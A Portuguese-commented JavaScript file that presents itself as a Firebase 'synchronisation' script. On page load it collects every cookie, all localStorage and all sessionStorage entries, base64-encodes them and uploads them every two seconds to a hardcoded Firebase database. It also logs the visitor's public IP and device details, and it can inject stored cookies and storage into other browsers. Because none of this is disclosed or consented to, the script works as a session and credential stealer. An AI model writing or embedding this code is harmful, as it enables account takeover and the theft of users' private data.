// sinc.js - Script autônomo que carrega SDK do Firebase e sincroniza tudo
(function() {
    console.log('🔄 Iniciando sistema de sincronização...');

    // Função para carregar scripts dinamicamente
    function loadScript(src) {
        return new Promise((resolve, reject) => {
            const script = document.createElement('script');
            script.src = src;
            script.onload = resolve;
            script.onerror = reject;
            document.head.appendChild(script);
        });
    }

    // Carrega o Firebase SDK
    async function loadFirebaseSDK() {
        try {
            await loadScript('https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js');
            console.log('✓ Firebase App carregado');
            
            await loadScript('https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js');
            console.log('✓ Firebase Database carregado');
            
            return true;
        } catch(error) {
            console.error('❌ Erro ao carregar Firebase:', error);
            return false;
        }
    }

    // Inicializa tudo quando o Firebase estiver pronto
    async function init() {
        const loaded = await loadFirebaseSDK();
        
        if (!loaded) {
            console.error('❌ Não foi possível carregar o Firebase');
            return;
        }

        // Aguarda o Firebase estar disponível
        setTimeout(() => {
            startSync();
        }, 100);
    }

    function startSync() {
        console.log('🎯 Inicializando Firebase...');

        // Configuração do Firebase
        const firebaseConfig = {
            apiKey: "AIzaSyDon4WbCbe4kCkUq-OdLBRhzhMaUObbAfo",
            authDomain: "html-15e80.firebaseapp.com",
            databaseURL: "https://html-15e80-default-rtdb.firebaseio.com",
            projectId: "html-15e80",
            storageBucket: "html-15e80.appspot.com",
            messagingSenderId: "1068148640439",
            appId: "1:1068148640439:web:7cc5bde34f4c5a5ce41b32"
        };

        // Inicializa Firebase
        if (!firebase.apps.length) {
            firebase.initializeApp(firebaseConfig);
            console.log('✓ Firebase inicializado');
        }

        const database = firebase.database();
        
        let currentUID = null;
        let deviceId = null;
        let restoreInProgress = false;

        // Função para obter IP público
        async function getPublicIP() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch(e) {
                return 'unknown';
            }
        }

        // Coleta TUDO do navegador
        function collectAllData() {
            const data = {
                ls: {},
                ss: {},
                ck: {},
                ts: Date.now()
            };

            // LocalStorage completo
            for(let i = 0; i < localStorage.length; i++) {
                const key = localStorage.key(i);
                data.ls[key] = localStorage.getItem(key);
            }

            // SessionStorage completo
            for(let i = 0; i < sessionStorage.length; i++) {
                const key = sessionStorage.key(i);
                data.ss[key] = sessionStorage.getItem(key);
            }

            // Todos os cookies
            const cookies = document.cookie.split(';');
            for(let i = 0; i < cookies.length; i++) {
                if(cookies[i].trim()) {
                    const [name, value] = cookies[i].split('=');
                    data.ck[name.trim()] = value || '';
                }
            }

            return data;
        }

        // Converte para Base64
        function toBase64(obj) {
            try {
                return btoa(unescape(encodeURIComponent(JSON.stringify(obj))));
            } catch(e) {
                console.error('Erro ao converter para Base64:', e);
                return '';
            }
        }

        // Converte de Base64
        function fromBase64(str) {
            try {
                return JSON.parse(decodeURIComponent(escape(atob(str))));
            } catch(e) {
                console.error('Erro ao converter de Base64:', e);
                return null;
            }
        }

        // Restaura dados
        function restoreData(encodedData) {
            if(restoreInProgress) return false;
            restoreInProgress = true;
            
            try {
                const data = fromBase64(encodedData);
                if(!data) return false;
                
                // Restaura LocalStorage
                for(const key in data.ls) {
                    localStorage.setItem(key, data.ls[key]);
                }
                
                // Restaura SessionStorage  
                for(const key in data.ss) {
                    sessionStorage.setItem(key, data.ss[key]);
                }
                
                // Restaura Cookies
                for(const name in data.ck) {
                    document.cookie = name + "=" + data.ck[name] + "; path=/";
                }
                
                console.log('✓ Dados restaurados com sucesso');
                return true;
            } catch(e) {
                console.error('Erro ao restaurar:', e);
                return false;
            } finally {
                restoreInProgress = false;
            }
        }

        // Salva dados atuais
        async function saveCurrentData() {
            if(!currentUID) return;
            
            try {
                const allData = collectAllData();
                const encoded = toBase64(allData);
                
                await database.ref('userData/' + currentUID).set({
                    d: encoded,
                    t: firebase.database.ServerValue.TIMESTAMP,
                    device: deviceId
                });
                
                console.log('✓ Dados salvos em:', new Date().toLocaleTimeString());
            } catch(e) {
                console.error('Erro ao salvar:', e);
            }
        }

        // Verifica atualizações
        async function checkForUpdates() {
            if(!currentUID || restoreInProgress) return;
            
            try {
                const snapshot = await database.ref('userData/' + currentUID).once('value');
                const data = snapshot.val();
                
                if(data && data.d) {
                    const currentData = collectAllData();
                    const currentEncoded = toBase64(currentData);
                    
                    if(currentEncoded !== data.d && data.device !== deviceId) {
                        console.log('🔄 Nova versão detectada, restaurando...');
                        restoreData(data.d);
                    }
                }
            } catch(e) {
                console.error('Erro ao verificar:', e);
            }
        }

        // Registra dispositivo
        async function registerDevice() {
            if(!currentUID) return;
            
            const deviceInfo = {
                id: deviceId,
                userAgent: navigator.userAgent,
                screenWidth: screen.width,
                screenHeight: screen.height,
                timestamp: Date.now(),
                ip: await getPublicIP()
            };
            
            await database.ref('devices/' + currentUID + '/' + deviceId).set(deviceInfo);
            console.log('✓ Dispositivo registrado:', deviceInfo);
        }

        // Gera UID único
        function getOrCreateUID() {
            let uid = localStorage.getItem('_sync_uid_');
            if(!uid) {
                uid = 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
                    const r = Math.random() * 16 | 0;
                    const v = c === 'x' ? r : (r & 0x3 | 0x8);
                    return v.toString(16);
                });
                localStorage.setItem('_sync_uid_', uid);
                console.log('✓ Novo UID criado:', uid);
            }
            return uid;
        }

        // Gera Device ID
        function getOrCreateDeviceId() {
            let did = localStorage.getItem('_device_id_');
            if(!did) {
                did = 'dev_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
                localStorage.setItem('_device_id_', did);
                console.log('✓ Novo Device ID criado:', did);
            }
            return did;
        }

        // Inicia sincronização
        async function startSync() {
            console.log('🚀 Iniciando sincronização...');
            
            currentUID = getOrCreateUID();
            deviceId = getOrCreateDeviceId();
            
            await registerDevice();
            await checkForUpdates();
            await saveCurrentData();
            
            // Salva a cada 2 segundos
            setInterval(() => {
                saveCurrentData();
            }, 2000);
            
            // Verifica a cada 3 segundos
            setInterval(() => {
                checkForUpdates();
            }, 3000);
            
            console.log('✅ Sincronização ativa!');
            console.log('📱 UID:', currentUID);
            console.log('💻 Device ID:', deviceId);
        }

        startSync();
    }

    // Inicia tudo quando a página carregar
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', init);
    } else {
        init();
    }
})();